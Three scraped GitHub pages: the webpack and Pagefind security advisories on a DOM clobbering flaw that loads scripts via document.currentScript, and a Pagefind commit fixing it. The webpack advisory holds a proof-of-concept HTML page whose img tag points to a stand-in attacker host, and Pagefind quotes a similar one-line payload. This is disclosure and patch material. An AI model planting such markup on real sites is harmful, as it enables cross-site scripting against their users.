=== Content from github.com_f5b16ed9_20250110_202616.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwebpack%2Fwebpack%2Fsecurity%2Fadvisories%2FGHSA-4vvj-4cpr-p986)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwebpack%2Fwebpack%2Fsecurity%2Fadvisories%2FGHSA-4vvj-4cpr-p986)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=webpack%2Fwebpack)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[webpack](/webpack)
/
**[webpack](/webpack/webpack)**
Public

* [Notifications](/login?return_to=%2Fwebpack%2Fwebpack) You must be signed in to change notification settings
* [Fork
  8.9k](/login?return_to=%2Fwebpack%2Fwebpack)
* [Star
   65k](/login?return_to=%2Fwebpack%2Fwebpack)

* [Code](/webpack/webpack)
* [Issues
  137](/webpack/webpack/issues)
* [Pull requests
  110](/webpack/webpack/pulls)
* [Discussions](/webpack/webpack/discussions)
* [Actions](/webpack/webpack/actions)
* [Projects
  1](/webpack/webpack/projects)
* [Security](/webpack/webpack/security)
* [Insights](/webpack/webpack/pulse)

Additional navigation options

* [Code](/webpack/webpack)
* [Issues](/webpack/webpack/issues)
* [Pull requests](/webpack/webpack/pulls)
* [Discussions](/webpack/webpack/discussions)
* [Actions](/webpack/webpack/actions)
* [Projects](/webpack/webpack/projects)
* [Security](/webpack/webpack/security)
* [Insights](/webpack/webpack/pulse)

# DOM Clobbering Gadget found in Webpack's AutoPublicPathRuntimeModule that leads to XSS

Moderate

[alexander-akait](/alexander-akait)
published
GHSA-4vvj-4cpr-p986
Aug 27, 2024

## Package

npm

webpack
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<5.93.0

## Patched versions

>=5.94.0

## Description

Hi, Webpack developer team!

### Summary

We discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.

We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.

### Details

#### Backgrounds

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] <https://scnps.co/papers/sp23_domclob.pdf>

[2] <https://research.securitum.com/xss-in-amp4email-dom-clobbering/>

#### Gadgets found in Webpack

We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript)
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();

```

However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.

### PoC

Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.

Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:

```
// entry.js
import('./import1.js')
  .then(module => {
    module.hello();
  })
  .catch(err => {
    console.error('Failed to load module', err);
  });

```

```
// import1.js
export function hello () {
  console.log('Hello');
}

```

The webpack.config.js is set up as follows:

```
const path = require('path');

module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    publicPath: "auto", // Or leave this field not set
  },
  target: 'web',
  mode: 'development',
};

```

When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>Webpack Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name="currentScript" src="https://attacker.controlled.server/"></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script src="./dist/webpack-gadgets.bundle.js"></script>
<body>
</body>
</html>

```
### Impact

This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.

### Patch

A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: <https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174>

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();

```

Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.

### Severity

Moderate

6.4

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
High

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
Low

Integrity
Low

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H

### CVE ID

CVE-2024-43788

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

### Credits

* [![@jackfromeast](https://avatars.githubusercontent.com/u/51242003?s=40&v=4)](/jackfromeast)
  [jackfromeast](/jackfromeast)
  Analyst
* [![@ishmeals](https://avatars.githubusercontent.com/u/44672716?s=40&v=4)](/ishmeals)
  [ishmeals](/ishmeals)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_52e8d871_20250110_202616.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCloudCannon%2Fpagefind%2Fsecurity%2Fadvisories%2FGHSA-gprj-6m2f-j9hx)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCloudCannon%2Fpagefind%2Fsecurity%2Fadvisories%2FGHSA-gprj-6m2f-j9hx)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=CloudCannon%2Fpagefind)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[CloudCannon](/CloudCannon)
/
**[pagefind](/CloudCannon/pagefind)**
Public

* [Notifications](/login?return_to=%2FCloudCannon%2Fpagefind) You must be signed in to change notification settings
* [Fork
  123](/login?return_to=%2FCloudCannon%2Fpagefind)
* [Star
   3.8k](/login?return_to=%2FCloudCannon%2Fpagefind)

* [Code](/CloudCannon/pagefind)
* [Issues
  145](/CloudCannon/pagefind/issues)
* [Pull requests
  10](/CloudCannon/pagefind/pulls)
* [Discussions](/CloudCannon/pagefind/discussions)
* [Actions](/CloudCannon/pagefind/actions)
* [Projects
  0](/CloudCannon/pagefind/projects)
* [Security](/CloudCannon/pagefind/security)
* [Insights](/CloudCannon/pagefind/pulse)

Additional navigation options

* [Code](/CloudCannon/pagefind)
* [Issues](/CloudCannon/pagefind/issues)
* [Pull requests](/CloudCannon/pagefind/pulls)
* [Discussions](/CloudCannon/pagefind/discussions)
* [Actions](/CloudCannon/pagefind/actions)
* [Projects](/CloudCannon/pagefind/projects)
* [Security](/CloudCannon/pagefind/security)
* [Insights](/CloudCannon/pagefind/pulse)

# DOM clobbering could escalate to XSS

Moderate

[bglw](/bglw)
published
GHSA-gprj-6m2f-j9hx
Sep 3, 2024

## Package

npm

@pagefind/default-ui
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<1.1.1

## Patched versions

1.1.1

npm

@pagefind/modular-ui
([npm](/advisories?query=ecosystem%3Anpm))

<1.1.1

1.1.1

npm

pagefind
([npm](/advisories?query=ecosystem%3Anpm))

<1.1.1

1.1.1

cargo

pagefind
([Rust](/advisories?query=ecosystem%3Arust))

<1.1.1

1.1.1

## Description

Pagefind initializes its dynamic JavaScript and WebAssembly files relative to the location of the first script you load. This information is gathered by looking up the value of `document.currentScript.src`.

It is possible to "clobber" this lookup with otherwise benign HTML on the page, for example:

```
<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>
```

This will cause `document.currentScript.src` to resolve as an external domain, which will then be used by Pagefind to load dependencies.

This exploit would only work in the case that an attacker could inject HTML to your live, hosted, website. In these cases, this would act as a way to escalate the privilege available to an attacker. This assumes they have the ability to add some elements to the page (for example, `img` tags with a `name` attribute), but not others, as adding a `script` to the page would itself be the XSS vector.

Pagefind has tightened this resolution by ensuring the source is loaded from a valid script element. There are no reports of this being exploited in the wild via Pagefind.

### Original Report

If an attacker can inject benign html, such as:

`<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>`

they can clobber `document.currentScript.src` leading to XSS in your library.

Here is the same attack on webpack that was accepted: [GHSA-4vvj-4cpr-p986](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986 "GHSA-4vvj-4cpr-p986")

### Severity

Moderate

6.4

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
High

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
Low

Integrity
Low

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H

### CVE ID

CVE-2024-45389

### Weaknesses

[CWE-79](/advisories?query=cwe%3A79)

### Credits

* [![@ishmeals](https://avatars.githubusercontent.com/u/44672716?s=40&v=4)](/ishmeals)
  [ishmeals](/ishmeals)
  Reporter
* [![@jackfromeast](https://avatars.githubusercontent.com/u/51242003?s=40&v=4)](/jackfromeast)
  [jackfromeast](/jackfromeast)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_fe90ed7c_20250110_202616.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCloudCannon%2Fpagefind%2Fcommit%2F14ec96864eabaf1d7d809d5da0186a8856261eeb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCloudCannon%2Fpagefind%2Fcommit%2F14ec96864eabaf1d7d809d5da0186a8856261eeb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=CloudCannon%2Fpagefind)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[CloudCannon](/CloudCannon)
/
**[pagefind](/CloudCannon/pagefind)**
Public

* [Notifications](/login?return_to=%2FCloudCannon%2Fpagefind) You must be signed in to change notification settings
* [Fork
  123](/login?return_to=%2FCloudCannon%2Fpagefind)
* [Star
   3.8k](/login?return_to=%2FCloudCannon%2Fpagefind)

* [Code](/CloudCannon/pagefind)
* [Issues
  145](/CloudCannon/pagefind/issues)
* [Pull requests
  10](/CloudCannon/pagefind/pulls)
* [Discussions](/CloudCannon/pagefind/discussions)
* [Actions](/CloudCannon/pagefind/actions)
* [Projects
  0](/CloudCannon/pagefind/projects)
* [Security](/CloudCannon/pagefind/security)
* [Insights](/CloudCannon/pagefind/pulse)

Additional navigation options

* [Code](/CloudCannon/pagefind)
* [Issues](/CloudCannon/pagefind/issues)
* [Pull requests](/CloudCannon/pagefind/pulls)
* [Discussions](/CloudCannon/pagefind/discussions)
* [Actions](/CloudCannon/pagefind/actions)
* [Projects](/CloudCannon/pagefind/projects)
* [Security](/CloudCannon/pagefind/security)
* [Insights](/CloudCannon/pagefind/pulse)

## Commit

[Permalink](/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#696](https://github.com/CloudCannon/pagefind/pull/696) from CloudCannon/fix/dom-clobber

[Browse files](/CloudCannon/pagefind/tree/14ec96864eabaf1d7d809d5da0186a8856261eeb)
Browse the repository at this point in the history

```
Add safety checks around accesses for `document.currentScript.src`
```

* Loading branch information

[![@bglw](https://avatars.githubusercontent.com/u/40188355?s=40&v=4)](/bglw)

[bglw](/CloudCannon/pagefind/commits?author=bglw "View all commits by bglw")
authored
Sep 3, 2024

2 parents
[012ac7e](/CloudCannon/pagefind/commit/012ac7e27f2b102df45481fd7d63be70bd639972)
+
[9528ef5](/CloudCannon/pagefind/commit/9528ef529b0cf5a45fc7b25b7aed43f54544c28d)

commit 14ec968

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**39 additions**
and
**13 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* pagefind\_ui

  + default

    - svelte

      * pagefind\_ui/default/svelte/ui.svelte
        [ui.svelte](#diff-8d2cec211dae2507e4a7984d5e1ad1fdcbe831265841b8a25f4da8cd0569295c)
    - pagefind\_ui/default/ui-core.js
      [ui-core.js](#diff-a5a1952a100424a50ebfa9721d106e6f725099899ac1183b9d2ce3e1c70dee3d)
  + modular

    - pagefind\_ui/modular/modular-core.js
      [modular-core.js](#diff-c50eb5fec8f3c42c828513680cf04bb3c86076249d9f025f4d171e5281b08722)

## There are no files selected for viewing

16 changes: 13 additions & 3 deletions

16
[pagefind\_ui/default/svelte/ui.svelte](#diff-8d2cec211dae2507e4a7984d5e1ad1fdcbe831265841b8a25f4da8cd0569295c "pagefind_ui/default/svelte/ui.svelte")

Show comments

[View file](/CloudCannon/pagefind/blob/14ec96864eabaf1d7d809d5da0186a8856261eeb/pagefind_ui/default/svelte/ui.svelte)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -99,11 +99,21 @@ |
|  |  | [ |
|  |  | `Pagefind couldn't be loaded from ${this.options.bundlePath}pagefind.js`, |
|  |  | `You can configure this by passing a bundlePath option to PagefindUI`, |
|  |  | `[DEBUG: Loaded from ${ |
|  |  | document?.currentScript?.src ?? "no known script location" |
|  |  | }]`, |
|  |  | ].join("\n") |
|  |  | ); |
|  |  | // Important: Check that the element is indeed a <script> node, to avoid a DOM clobbering vulnerability |
|  |  | if ( |
|  |  | document?.currentScript && |
|  |  | document.currentScript.tagName.toUpperCase() === "SCRIPT" |
|  |  | ) { |
|  |  | console.error( |
|  |  | `[DEBUG: Loaded from ${ |
|  |  | document.currentScript.src ?? "bad script location" |
|  |  | }]` |
|  |  | ); |
|  |  | } else { |
|  |  | console.error("no known script location"); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if (!excerpt\_length) { |
| Expand Down | |  |

9 changes: 6 additions & 3 deletions

9
[pagefind\_ui/default/ui-core.js](#diff-a5a1952a100424a50ebfa9721d106e6f725099899ac1183b9d2ce3e1c70dee3d "pagefind_ui/default/ui-core.js")

Show comments

[View file](/CloudCannon/pagefind/blob/14ec96864eabaf1d7d809d5da0186a8856261eeb/pagefind_ui/default/ui-core.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,9 +2,12 @@ import PagefindSvelte from "./svelte/ui.svelte"; |
|  |  |  |
|  |  | let scriptBundlePath; |
|  |  | try { |
|  |  | scriptBundlePath = new URL(document.currentScript.src).pathname.match( |
|  |  | /^(.\*\/)(?:pagefind-)?ui.js.\*$/ |
|  |  | )[1]; |
|  |  | // Important: Check that the element is indeed a <script> node, to avoid a DOM clobbering vulnerability |
|  |  | if (document?.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') { |
|  |  | scriptBundlePath = new URL(document.currentScript.src).pathname.match( |
|  |  | /^(.\*\/)(?:pagefind-)?ui.js.\*$/ |
|  |  | )[1]; |
|  |  | } |
|  |  | } catch (e) { |
|  |  | scriptBundlePath = "/pagefind/"; |
|  |  | } |
| Expand Down | |  |

27 changes: 20 additions & 7 deletions

27
